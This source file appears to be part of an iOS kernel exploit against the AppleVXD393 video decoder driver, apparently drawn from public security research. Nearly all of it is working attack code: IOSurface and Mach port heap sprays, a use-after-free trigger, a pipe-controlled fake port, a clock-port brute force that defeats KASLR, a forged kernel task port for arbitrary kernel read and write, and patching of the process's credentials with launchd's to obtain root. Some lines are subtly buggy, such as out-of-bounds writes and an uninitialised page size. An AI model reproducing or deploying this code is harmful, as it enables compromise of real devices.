#include <mach-o/loader.h>
#include <mach/mach_time.h>
#include <sys/mman.h>
#include <Foundation/Foundation.h>
#include "applevxd393.h"
#include "helper.h"
#include "iosurface.h"
#include "spray.h"


int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id,
					    char *key)
{
    return io_surface_spray(connection, surface_id, CHUNK_SPRAY_SIZE, key, NULL, 0);
}

int spray_kalloc_64_with_port_pointers(io_connect_t *connection, uint32_t *surface_id,
						 uint64_t target_port_pointer,
						 uint64_t own_task_port_pointer,
						 uint64_t host_port_pointer, char *key)
{
    uint64_t *pointer_data;
    size_t pointer_data_size;

    pointer_data_size = 3 * sizeof(uint64_t);

    pointer_data = calloc(1, pointer_data_size);
    pointer_data[1] = target_port_pointer;
    pointer_data[2] = target_port_pointer;
    pointer_data[3] = own_task_port_pointer;
    pointer_data[4] = host_port_pointer;

    return io_surface_spray(connection, surface_id, CHUNK_SPRAY_SIZE, key,
			    (void *)pointer_data, pointer_data_size);
}

int search_for_pointer_leak(io_connect_t *connection, uint32_t *surface_id,
			    uint64_t *port_pointer, uint64_t *other_pointer,
			    uint64_t *host_pointer)
{
    kern_return_t ret;
    uint32_t *get_value_output;
    uint32_t cmp1, cmp2;
    size_t i, output_size;
    void *ptr_to_leak;

    output_size = GET_PREFIX_LENGTH;
    output_size += N_OSDATA_SPRAY * ((2*CHUNK_SPRAY_SIZE) + sizeof(uint32_t));
    get_value_output = calloc(output_size, sizeof(uint32_t));
    output_size *= sizeof(uint32_t);
    if (io_surface_get_value(connection, surface_id, get_value_output,
				    &output_size))
    {
    	ERROR_LOG2("Could Not Search IO Surface Properties: %x", ret);
	return 1;
    }

    ptr_to_leak = memmem((void *)(&get_value_output[36]),
			 output_size - (sizeof(uint32_t) * 36),
			 "\xff\xff\xff", 0x3);
    if (ptr_to_leak)
    {
	ptr_to_leak -= 5;
	*port_pointer = *(uint64_t *)ptr_to_leak;
	DEBUG_LOG2("Port Pointer Leak: 0x%016llx", *(uint64_t *)ptr_to_leak);

	ptr_to_leak += 8;
	*other_pointer = *(uint64_t *)ptr_to_leak;
	DEBUG_LOG2("Other Port Pointer: 0x%016llx", *(uint64_t *)ptr_to_leak);

	ptr_to_leak += 8;
	*host_pointer = *(uint64_t *)ptr_to_leak;
	DEBUG_LOG2("Host Port Pointer Leak: 0x%016llx", *(uint64_t *)ptr_to_leak);
    }
    else
    {
	*port_pointer = 0x0;
	*other_pointer = 0x0;
	*host_pointer = 0x0;
	ERROR_LOG2("Did Not Found Any Port Pointer Leaks");
	return 1;
    }

    return 0;
}

int trigger_bug(io_connect_t *userclient_connection, uint32_t *surface_id)
{
    if (create_decoder(userclient_connection, surface_id))
	return 1;

    return destroy_decoder(userclient_connection);
}

int trigger_free(io_connect_t *userclient_connection)
{
    return destroy_decoder(userclient_connection);
}

struct ool_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

typedef struct ool_msg * ool_msg_t;

mach_msg_return_t send_target_to_other_receive(mach_port_t *other_receive_port,
					       mach_port_t *target_port)
{
    mach_port_t *ports;
    ool_msg_t ool_msg;
    mach_msg_return_t ret;

    ports = calloc(1, sizeof(mach_port_t));
    ool_msg = calloc(1, sizeof(struct ool_msg));

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  sizeof(struct ool_msg);
    ool_msg->header.msgh_remote_port = *other_receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = 1;

    ool_msg->ool_ports.address = ports;
    ool_msg->ool_ports.count = 1;
    ool_msg->ool_ports.deallocate = 0;
    ool_msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    ool_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    *ports = *target_port;

    if ((ret = mach_msg_send(&ool_msg->header)) != MACH_MSG_SUCCESS)
    {
	ERROR_LOG2("Sending Mach Message Failed: %x", ret);
    }
    else
    {
	DEBUG_LOG2("Successfully Sent target_port To other_receive_port");
    }

    return ret;
}

void prepare_pipes(int **pipe_fds)
{
    int i;
    int pipe_fds_tmp[2];

    *pipe_fds = calloc(2 * N_PIPES, sizeof(int));
    for (i = 0; i < N_PIPES; i++)
    {
	pipe(pipe_fds_tmp);
	(*pipe_fds)[2*i] = pipe_fds_tmp[0];
	(*pipe_fds)[2*i+1] = pipe_fds_tmp[1];
    }
}

int prepare_ports(mach_port_t **before_ports, mach_port_t **after_ports,
		  mach_port_t *receive_port, mach_port_t *other_receive_port,
		  mach_port_t *target_port, mach_port_t **spray_ports,
		  mach_port_t *own_task_port)
{
    int i, j, k, l, ret;

    *before_ports = calloc(N_BEFORE_PORTS, sizeof(mach_port_t));
    *after_ports = calloc(N_AFTER_PORTS, sizeof(mach_port_t));
    *spray_ports = calloc(N_SPRAY_PORTS, sizeof(mach_port_t));

    for (i = 0; i < N_BEFORE_PORTS; i++)
    {
	if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*before_ports)[i])) != KERN_SUCCESS)
	{
	    ERROR_LOG2("before_ports Allocation %d Failed: %x", i, ret);
	    goto clean_before;
	}
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, target_port) != KERN_SUCCESS))
    {
	ERROR_LOG2("target_port Allocation Failed: %x", ret);
	goto clean_before;
    }
    mach_port_insert_right(mach_task_self(), *target_port, *target_port, MACH_MSG_TYPE_MAKE_SEND);

    for (j = 0; j < N_AFTER_PORTS; j++)
    {
	if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*after_ports)[j])) != KERN_SUCCESS)
	{
	    ERROR_LOG2("after_ports Allocation %d Failed: %x", j, ret);
	    goto clean_after;
	}
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receive_port)) != KERN_SUCCESS)
    {
	ERROR_LOG2("receive_port Allocation Failed: %x", ret);
	goto clean_after;
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, other_receive_port)) != KERN_SUCCESS)
    {
	ERROR_LOG2("other_receiver_port Allocation Failed: %x", ret);
	mach_port_destroy(mach_task_self(), *receive_port);
	goto clean_after;
    }

    for (l = 0; l < N_SPRAY_PORTS; l++)
    {
	if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*spray_ports)[l])) != KERN_SUCCESS)
	{
	    ERROR_LOG2("spray_ports Allocation %d Failed: %x", l, ret);
	    mach_port_destroy(mach_task_self(), *receive_port);
	    mach_port_destroy(mach_task_self(), *other_receive_port);
	    goto clean_spray;
	}
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, own_task_port)) != KERN_SUCCESS)
    {
	ERROR_LOG2("own_task_port Allocation Failed: %x", ret);
	mach_port_destroy(mach_task_self(), *receive_port);
	mach_port_destroy(mach_task_self(), *other_receive_port);
	goto clean_spray;
    }

    mach_port_insert_right(mach_task_self(), *own_task_port,
			   *own_task_port, MACH_MSG_TYPE_MAKE_SEND);

    if (send_target_to_other_receive(other_receive_port, target_port) != MACH_MSG_SUCCESS)
    {
	goto clean_spray;
    }

    ret = 0;
    goto out;

clean_spray:
    for (k = 0; k < l; k++)
	mach_port_destroy(mach_task_self(), (*spray_ports)[k]);

clean_after:
    mach_port_destroy(mach_task_self(), *target_port);
    for (k = 0; k < j; k++)
	mach_port_destroy(mach_task_self(), (*after_ports)[k]);

clean_before:
    for (k = 0; k < i; k++)
	mach_port_destroy(mach_task_self(), (*before_ports)[k]);

    ret = 1;

out:
    if (ret)
    {
	ERROR_LOG2("Could Not Prepare Ports");
    }
    else
    {
	DEBUG_LOG2("Prepared Ports");
    }

    return ret;
}

int leak_port_pointer(mach_port_t *receive_port, mach_port_t *target_port,
				    mach_port_t *other_port)
{
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++)
    {
	if (i == 2)
	    ports[i] = *target_port;
	else if (i == 3)
	    ports[i] = *other_port;
	else if (i == 4)
	    ports[i] = mach_host_self();
	else
	    ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports))
    {
	ERROR_LOG2("Could Not Leak Port Pointers");
	ret = 1;
    }
    else
    {
	DEBUG_LOG2("Sprayed Heap To Leak Port Pointer");
	ret = 0;
    }

    free(ports);
    return ret;
}

int spray_kalloc_64_with_zeroes(mach_port_t **spray_ports)
{
    int i, ret;
    uint8_t *data;

    data = calloc(KALLOC_64, sizeof(uint8_t));

    for (i = 0; i < N_SPRAY_PORTS; i++)
    {
	if ((ret = ool_descriptor_spray(&(*spray_ports)[i], data, KALLOC_64)) != MACH_MSG_SUCCESS)
	{
	    ERROR_LOG2("Sending Mach Message %d Failed: %x", i, ret);
	    ret = 1;
	    break;
	}
    }

    free(data);

    if (ret)
    {
	ERROR_LOG2("Spraying kalloc.64 With Zeroes Failed");
    }
    else
    {
	DEBUG_LOG2("Spraying kalloc.64 With Zeroes Successful");
    }

    return ret;
}

int spray_kalloc_4096_with_zeroes(mach_port_t **spray_ports)
{
    int i, ret;
    uint8_t *data;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ret = 0;

    for (i = 0; i < N_SPRAY_PORTS / 8; i++)
    {
	if ((ret = ool_descriptor_spray(&(*spray_ports)[i], data, KALLOC_4096)) != MACH_MSG_SUCCESS)
	{
	    ERROR_LOG2("Sending Mach Message %d Failed: %x", i, ret);
	    ret = 1;
	    break;
	}
    }

    free(data);

    if (ret)
    {
	ERROR_LOG2("Spraying kalloc.4096 With Zeroes Failed");
    }
    else
    {
	DEBUG_LOG2("Spraying kalloc.4096 With Zeroes Successful");
    }

    return ret;
}

int spray_kalloc_4096(mach_port_t **spray_ports, mach_port_t *target_port,
				    uint64_t port_offset, int *port_number)
{
    int i, ret;
    uint8_t *data;
    uint64_t *ip_context;
    uint64_t offset;
    mach_port_context_t context;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ip_context = (uint64_t *)(data + port_offset - SIZEOF_VM_MAP_HEADER + IP_CONTEXT_PORT_OFFSET);
    ret = 0;

    for (i = 0; i < N_SPRAY_PORTS; i++)
    {
	*ip_context = MAGIC_CONSTANT + i;
	if ((ret = ool_descriptor_spray(&(*spray_ports)[i], data, KALLOC_4096)) != MACH_MSG_SUCCESS)
	{
	    ERROR_LOG2("Sending Mach Message %d Failed: %x", i, ret);
	    ret = 1;
	    break;
	}
    }

    if (!ret)
    {
	mach_port_get_context(mach_task_self(), *target_port, &context);
	DEBUG_LOG2("Context: %lx", context);

	if (context - MAGIC_CONSTANT >= N_SPRAY_PORTS)
	{
	    ERROR_LOG2("Context To Big. Spray Not Successful.");
	    ret = 1;
	}
	else
	{
	    *port_number = context - MAGIC_CONSTANT;
	    DEBUG_LOG2("Port Number: %d", *port_number);
	}
    }

    if (ret)
    {
	ERROR_LOG2("Could Not Spray Into target_port");
    }
    else
    {
	DEBUG_LOG2("Spraying kalloc.4096 Successful");
    }

    free(data);
    return ret;
}

uint64_t get_port_offset(uint64_t *port_pointer)
{
    return (*port_pointer) & 0xfff;
}

uint64_t get_port_page(uint64_t *port_pointer)
{
    return (*port_pointer) & ~0xfff;
}

int control_port_via_pipe(int **pipe_fds, uint64_t offset, mach_port_t *port_to_destroy,
			  mach_port_t *target_port, int *pipe_number)
{
    int i, ret;
    uint8_t *data;
    uint64_t *ip_context;
    mach_port_context_t context;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    ip_context = (uint64_t *)(data + offset + IP_CONTEXT_PORT_OFFSET);
    ret = 0;

    mach_port_destroy(mach_task_self(), *port_to_destroy);

    for (i = 0; i < N_PIPES; i++)
    {
        *ip_context = MAGIC_CONSTANT + i;
	write((*pipe_fds)[2*i+1], data, KALLOC_4096);
    }

    mach_port_get_context(mach_task_self(), *target_port, &context);
    DEBUG_LOG2("Context: %lx", context);
    if (context - MAGIC_CONSTANT >= N_PIPES)
    {
	ERROR_LOG2("Context To Big. Spray Not Successful.");
	ret = 1;
    }
    else
    {
	*pipe_number = context - MAGIC_CONSTANT;
	DEBUG_LOG2("Pipe Number: %d", *pipe_number);
	DEBUG_LOG2("Now Controlling Target Chunk Via Pipes");
    }

    free(data);
    return ret;
}

uint64_t break_kaslr_via_clock_port(int read_fd, int write_fd, uint64_t port_offset, mach_port_t *target_port)
{
    int k;
    uint8_t *data, *data2;
    uint32_t *io_bits, *ip_srights;
    uint64_t *ip_context, *kobject, *lock_type;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    ip_context = (uint64_t *)(data + port_offset + IP_CONTEXT_PORT_OFFSET);
    io_bits = (uint32_t *)(data + port_offset + IO_BITS_PORT_OFFSET);
    ip_srights = (uint32_t *)(data + port_offset + IP_SRIGHTS_PORT_OFFSET);
    kobject = (uint64_t *)(data + port_offset + KOBJECT_PORT_OFFSET);
    lock_type = (uint64_t *)(data + port_offset + IO_LOCK_TYPE_PORT_OFFSET);

    *ip_context = MAGIC_CONSTANT;
    *io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    *ip_srights = 0xff;
    *lock_type = 0x11;

    DEBUG_LOG2("Break KASLR");
    for (k = 0; k < 0x300; k++)
    {
	*kobject =  KERNEL_BASE + SYSTEM_CLOCK_OFFSET + KERNEL_SLIDE_FOR_INDEX(k);
	read(read_fd, data2, KALLOC_4096+1);
	write(write_fd, data, KALLOC_4096);

	if (clock_sleep_trap(*target_port, 0, 0, 0, 0) != KERN_FAILURE)
	{
	    DEBUG_LOG2("KASLR Broken!");
	    DEBUG_LOG2("Leaked Ptr: %llx", *kobject);
	    DEBUG_LOG2("Leaked Kernel Base: %lx", KERNEL_BASE + KERNEL_SLIDE_FOR_INDEX(k));
	    DEBUG_LOG2("Kernel Slide: %x", KERNEL_SLIDE_FOR_INDEX(k));
	    goto broken;
	}
    }

    free(data);
    free(data2);
    ERROR_LOG2("Failed To Find Kernel Slide");
    return 0;

broken:
    free(data);
    free(data2);
    return KERNEL_BASE + KERNEL_SLIDE_FOR_INDEX(k);
}

uint64_t get_own_task_pointer(int read_fd, int write_fd, uint64_t port_offset,
			      uint64_t port_address, mach_port_t *target_port)
{
    uint64_t ip_receiver, is_task;

    ip_receiver = read_64bit(read_fd, write_fd, port_offset,
			     port_address + IP_RECEIVER_PORT_OFFSET,
			     target_port);
    DEBUG_LOG2("IP Receiver: %llx", ip_receiver);

    is_task = read_64bit(read_fd, write_fd, port_offset,
			 ip_receiver + IS_TASK_IPC_SPACE_OFFSET,
			 target_port);
    DEBUG_LOG2("Task Pointer: %llx", is_task);

    return is_task;
}

uint64_t get_kernel_task_pointer(int read_fd, int write_fd, uint64_t port_offset,
				 uint64_t port_address, mach_port_t *target_port)
{
    uint64_t own_task, kernel_task, bsd_info;
    uint32_t pid;

    own_task = get_own_task_pointer(read_fd, write_fd, port_offset, port_address,
				    target_port);

    for (bsd_info = read_64bit(read_fd, write_fd, port_offset,
			       own_task + BSD_INFO_TASK_OFFSET,
			       target_port);
	 bsd_info != 0;
	 bsd_info = read_64bit(read_fd, write_fd, port_offset,
			       bsd_info + NEXT_PROC_OFFSET,
			       target_port))
    {
	pid = read_32bit(read_fd, write_fd, port_offset,
			 bsd_info + PID_PROC_OFFSET,
			 target_port);
	if (pid == KERNEL_PID)
	    break;
    }

    DEBUG_LOG2("Pid: %d", pid);
    if (pid != KERNEL_PID)
    {
	ERROR_LOG2("Pid != 0. Could Not Get Kernel Task.");
	return 0;
    }

    DEBUG_LOG2("Kernel Proc: %llx", bsd_info);
    kernel_task = read_64bit(read_fd, write_fd, port_offset,
			     bsd_info + TASK_PROC_OFFSET,
			     target_port);
    DEBUG_LOG2("Kernel Task: 0x%llx", kernel_task);
    return kernel_task;
}

uint64_t get_kernel_vm_map(int read_fd, int write_fd, uint64_t port_offset,
			   uint64_t port_address, mach_port_t *target_port)
{
    uint64_t kernel_task, vm_map;

    kernel_task = get_kernel_task_pointer(read_fd, write_fd, port_offset, port_address,
					  target_port);
    if (kernel_task)
    {
	vm_map = read_64bit(read_fd, write_fd, port_offset,
			    kernel_task + VM_MAP_TASK_OFFSET,
			    target_port);
	DEBUG_LOG2("Kernel VM Map: 0x%llx", vm_map);
    }
    else
    {
	ERROR_LOG2("Could Not Get VM Map");
	return 0;
    }
    return vm_map;
}

uint64_t get_kernel_ip_receiver(int read_fd, int write_fd, uint64_t port_offset,
				mach_port_t *target_port, uint64_t host_pointer)
{
    uint64_t ip_receiver;

    ip_receiver = read_64bit(read_fd, write_fd, port_offset,
			     host_pointer + IP_RECEIVER_PORT_OFFSET,
			     target_port);
    DEBUG_LOG2("Kernel IP Receiver: 0x%llx", ip_receiver);
    return ip_receiver;
}

int create_kernel_task_port(int read_fd, int write_fd, uint64_t port_offset,
			    uint64_t port_address, mach_port_t *target_port,
			    uint64_t host_pointer)
{
    int ret;
    uint64_t task_offset;
    uint8_t *data, *data2, *task_lock_type;
    uint32_t *io_bits, *io_references, *ip_srights, *refcount, *active;
    uint64_t *kobject, *ip_receiver, *vm_map, *lock_type;
    mach_port_context_t magic;

    ret = 0;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    io_bits = (uint32_t *)(data + port_offset + IO_BITS_PORT_OFFSET);
    io_references = (uint32_t *)(data + port_offset + IO_REFERENCES_PORT_OFFSET);
    ip_srights = (uint32_t *)(data + port_offset + IP_SRIGHTS_PORT_OFFSET);
    kobject = (uint64_t *)(data + port_offset + KOBJECT_PORT_OFFSET);
    lock_type = (uint64_t *)(data + port_offset + IO_LOCK_TYPE_PORT_OFFSET);
    ip_receiver = (uint64_t *)(data + port_offset + IP_RECEIVER_PORT_OFFSET);

    *io_bits = IO_BITS_ACTIVE | IKOT_TASK;
    *io_references = 0xff;
    *ip_srights = 0xff;
    *lock_type = 0x11;
    *ip_receiver = get_kernel_ip_receiver(read_fd, write_fd, port_offset,
					  target_port, host_pointer);

    if (port_offset < 0x700)
	task_offset = 0x800;
    else
	task_offset = 0;

    refcount = (uint32_t *)(data + task_offset + REFCOUNT_TASK_OFFSET);
    vm_map = (uint64_t *)(data + task_offset + VM_MAP_TASK_OFFSET);
    task_lock_type = data + task_offset + LOCK_TYPE_TASK_OFFSET;
    active = (uint32_t *)(data + task_offset + ACTIVE_TASK_OFFSET);

    *refcount = 0xff;
    *task_lock_type = 0x22;
    *active = 1;
    *vm_map = get_kernel_vm_map(read_fd, write_fd, port_offset,
				port_address, target_port);
    if (!vm_map)
    {
	ERROR_LOG2("Could Not Create Kernel Task Port");
	ret = 1;
    }
    else
    {
	*kobject = (uint64_t)(data + task_offset);

	read(read_fd, data2, KALLOC_4096+1);
	write(write_fd, data, KALLOC_4096);
    }

    free(data);
    free(data2);
    return ret;
}

int patch_credentials(mach_port_t kernel_port, uint64_t port_address,
		      uint64_t *old_credentials)
{
    uint32_t pid, own_pid;
    uint64_t ip_receiver, is_task, bsd_info, own_proc;
    uint64_t launchd_credentials;

    DEBUG_LOG2("Start Patching Credentials");

    ip_receiver = kernel_read_64bit(kernel_port, port_address + IP_RECEIVER_PORT_OFFSET);
    is_task = kernel_read_64bit(kernel_port, ip_receiver + IS_TASK_IPC_SPACE_OFFSET);

    own_pid = getpid();
    launchd_credentials = 0;
    own_proc = 0;

    for (bsd_info = kernel_read_64bit(kernel_port, is_task + BSD_INFO_TASK_OFFSET);
	 bsd_info != 0;
	 bsd_info = kernel_read_64bit(kernel_port, bsd_info + NEXT_PROC_OFFSET))
    {
	pid = kernel_read_32bit(kernel_port, bsd_info + PID_PROC_OFFSET);

	if (pid == LAUNCHD_PID)
	    launchd_credentials = kernel_read_64bit(kernel_port, bsd_info + UCRED_PROC_OFFSET);
	else if (pid == own_pid)
	    own_proc = bsd_info;

	if (launchd_credentials && own_proc)
	    break;
    }

    if (!(launchd_credentials && own_proc))
    {
	ERROR_LOG2("Could Not Patch Credentials. Did Not Found All Procs.");
	return 1;
    }

    if (old_credentials)
	*old_credentials = kernel_read_64bit(kernel_port, own_proc + UCRED_PROC_OFFSET);
    kernel_write_64bit(kernel_port, own_proc + UCRED_PROC_OFFSET, launchd_credentials);
    return 0;
}

void patch_known_credentials(mach_port_t kernel_port, uint64_t port_address,
			     uint64_t known_credentials)
{
    uint64_t ip_receiver, is_task, own_proc;

    ip_receiver = kernel_read_64bit(kernel_port, port_address + IP_RECEIVER_PORT_OFFSET);
    is_task = kernel_read_64bit(kernel_port, ip_receiver + IS_TASK_IPC_SPACE_OFFSET);
    own_proc = kernel_read_64bit(kernel_port, is_task + BSD_INFO_TASK_OFFSET);
    kernel_write_64bit(kernel_port, own_proc + UCRED_PROC_OFFSET, known_credentials);
}

int elevate_privileges(mach_port_t kernel_port, uint64_t own_task_pointer)
{
    uint64_t old_credentials;
    uid_t current_uid;

    current_uid = getuid();
    DEBUG_LOG2("Current UID: %d", current_uid);
    setuid(0);
    DEBUG_LOG2("Current UID: %d (Should Be The Same)", getuid());

    patch_credentials(kernel_port, own_task_pointer, &old_credentials);
    setuid(0);
    DEBUG_LOG2("Current UID: %d", getuid());
    if (getuid() == 0)
    {
    	DEBUG_LOG2("Got r00t!");

    	patch_known_credentials(kernel_port, own_task_pointer, old_credentials);
    	setuid(current_uid);
    	DEBUG_LOG2("Current UID: %d", getuid());
	return 0;
    }
    else
    {
    	ERROR_LOG2("Something Went Wrong During Credential Patching");
	return 1;
    }
}

void clean_controlled_page(int read_fd, int write_fd)
{
    uint8_t *data, *data2;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    read(read_fd, data2, KALLOC_4096+1);
    write(write_fd, data, KALLOC_4096);

    free(data);
    free(data2);
}

int test_pid_read(int read_fd, int write_fd, uint64_t port_offset, uint64_t kernel_base,
		  mach_port_t target_port)
{
    if (read_32bit(read_fd, write_fd, port_offset, kernel_base, &target_port) == MH_MAGIC_64)
    {
    	DEBUG_LOG2("Got Kernel Read!");
	return 0;
    }
    else
    {
    	ERROR_LOG2("Something Went Wrong During Kernel Read");
	return 1;
    }
}

int test_kernel_read(mach_port_t kernel_port, uint64_t kernel_base)
{
    if (kernel_read_32bit(kernel_port, kernel_base) == MH_MAGIC_64)
    {
    	DEBUG_LOG2("Got Kernel Read via Kernel Task Port!");
	return 0;
    }
    else
    {
    	ERROR_LOG2("Something Went Wrong During Kernel Read Via Kernel Task Port");
	return 1;
    }
}

uint32_t read_32bit(int read_fd, int write_fd, uint64_t port_offset,
		    uint64_t address, mach_port_t *target_port)
{
    uint64_t task_offset;
    uint8_t *data, *data2;
    uint32_t *io_bits, *io_references, *ip_srights, *refcount;
    uint64_t *bsd_info, *ip_context, *kobject, *lock_type;
    mach_port_context_t magic;
    pid_t read_value;

    data = calloc(KALLOC_4096, sizeof(uint8_t));
    data2 = calloc(KALLOC_4096+1, sizeof(uint8_t));

    ip_context = (uint64_t *)(data + port_offset + IP_CONTEXT_PORT_OFFSET);
    io_bits = (uint32_t *)(data + port_offset + IO_BITS_PORT_OFFSET);
    io_references = (uint32_t *)(data + port_offset + IO_REFERENCES_PORT_OFFSET);
    ip_srights = (uint32_t *)(data + port_offset + IP_SRIGHTS_PORT_OFFSET);
    kobject = (uint64_t *)(data + port_offset + KOBJECT_PORT_OFFSET);
    lock_type = (uint64_t *)(data + port_offset + IO_LOCK_TYPE_PORT_OFFSET);

    *io_bits = IO_BITS_ACTIVE | IKOT_TASK;
    *io_references = 0xff;
    *ip_srights = 0xff;
    *ip_context = MAGIC_CONSTANT;
    *lock_type = 0x11;

    if (port_offset < 0x700)
	task_offset = 0x800;
    else
	task_offset = 0;

    refcount = (uint32_t *)(data + task_offset + REFCOUNT_TASK_OFFSET);
    bsd_info = (uint64_t *)(data + task_offset + BSD_INFO_TASK_OFFSET);

    *refcount = 0xff;
    *bsd_info = address - PID_PROC_OFFSET;

    *kobject = (uint64_t)(data + task_offset);

    read(read_fd, data2, KALLOC_4096+1);
    write(write_fd, data, KALLOC_4096);

    read_value = 0;
    pid_for_task(*target_port, &read_value);

    free(data);
    free(data2);

    return read_value;
}

uint64_t read_64bit(int read_fd, int write_fd, uint64_t port_offset,
		   uint64_t address, mach_port_t *target_port)
{
    uint32_t high, low;
    low = read_32bit(read_fd, write_fd, port_offset, address, target_port);
    high = read_32bit(read_fd, write_fd, port_offset, address+4, target_port);

    return (uint64_t)high << 32 | low;
}

// From Ian Beer's write-up
uint32_t get_free_pages()
{
  vm_statistics64_data_t stats;
  mach_msg_type_number_t stats_count;
  uint32_t ret;

  stats_count = HOST_VM_INFO64_COUNT;

  host_statistics64(mach_host_self(),
                    HOST_VM_INFO64,
                    (host_info64_t)&stats,
                    &stats_count);

  ret = stats.free_count - stats.speculative_count;

  return ret;
}

void force_GC()
{
    int i;
    long page_size;
    uint32_t page_count;
    size_t some_mb, bytes_size;
    char *base;

    page_count = get_free_pages();

    some_mb = 1024*1024*80;
    bytes_size = (page_count * page_size) + some_mb;

    page_size = sysconf(_SC_PAGESIZE);
    page_count = get_free_pages();

    base = mmap(NULL, bytes_size,
		PROT_READ | PROT_WRITE,
		MAP_ANON | MAP_PRIVATE,
		-1, 0);

    if (base == MAP_FAILED) {
	return;
    }

    for (i = 0; i < bytes_size / page_size; ++i ) {
	base[page_size * i] = i;
    }

    sleep(1);

    munmap(base, bytes_size);
}

// IBSparkes
void force_GC2()
{
    int i, j;
    uint64_t t0, t1;
    uint8_t *data;
    mach_port_t gc_ports[N_GC_PORTS];

    data = calloc(KALLOC_4096, sizeof(uint8_t));

    for (i = 0; i < N_GC_PORTS; i++)
    {
	if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gc_ports[i]) != KERN_SUCCESS)
	{
	    ERROR_LOG2("gc_ports Allocation %d Failed", i);
	    break;
	}
	t0 = mach_absolute_time();
	if (ool_descriptor_spray(&gc_ports[i], data, KALLOC_4096) != MACH_MSG_SUCCESS)
	{
	    ERROR_LOG2("Sending Mach Message %d Failed", i);
	    mach_port_destroy(mach_task_self(), gc_ports[i]);
	    break;
	}
	t1 = mach_absolute_time();

	if (t1 - t0 > ONE_MILLISECOND)
	{
	    mach_port_destroy(mach_task_self(), gc_ports[i]);
	    break;
	}
    }

    for (j = 0; j < i; j++)
	mach_port_destroy(mach_task_self(), gc_ports[j]);

    free(data);
    sleep(1);
    return;
}

void kernel_read(mach_port_t kernel_port, uint64_t address, void *read_value, size_t size)
{
    kern_return_t ret;
    size_t offset;
    mach_vm_size_t read_bytes, chunk;

    for (offset = 0; offset < size; offset += read_bytes)
    {
        chunk = 0xfff;
        if (chunk > size - offset)
            chunk = size - offset;

        if ((ret = mach_vm_read_overwrite(kernel_port,
					  address + offset,
					  chunk,
					  (mach_vm_address_t)read_value + offset,
					  &read_bytes)) != KERN_SUCCESS ||
            read_bytes == 0) {
            ERROR_LOG2("Failed To Do Kernel Read On 0x%llx: %x ", address, ret);
            break;
        }
    }
}

uint32_t kernel_read_32bit(mach_port_t kernel_port, uint64_t address)
{
    uint32_t read_value;

    kernel_read(kernel_port, address, (void *)&read_value, sizeof(uint32_t));
    return read_value;
}

uint64_t kernel_read_64bit(mach_port_t kernel_port, uint64_t address)
{
    uint64_t read_value;

    kernel_read(kernel_port, address, (void *)&read_value, sizeof(uint64_t));
    return read_value;
}

void kernel_write(mach_port_t kernel_port, uint64_t address, void *write_value, size_t size)
{
    kern_return_t ret;

    if ((ret = mach_vm_write(kernel_port, address, (vm_offset_t)write_value, size)) != KERN_SUCCESS)
    {
        ERROR_LOG2("Failed To Do Kernel Write On %llx: %x", address, ret);
    }
}

void kernel_write_64bit(mach_port_t kernel_port, uint64_t address, uint64_t write_value)
{
    kernel_write(kernel_port, address, &write_value, sizeof(uint64_t));
}
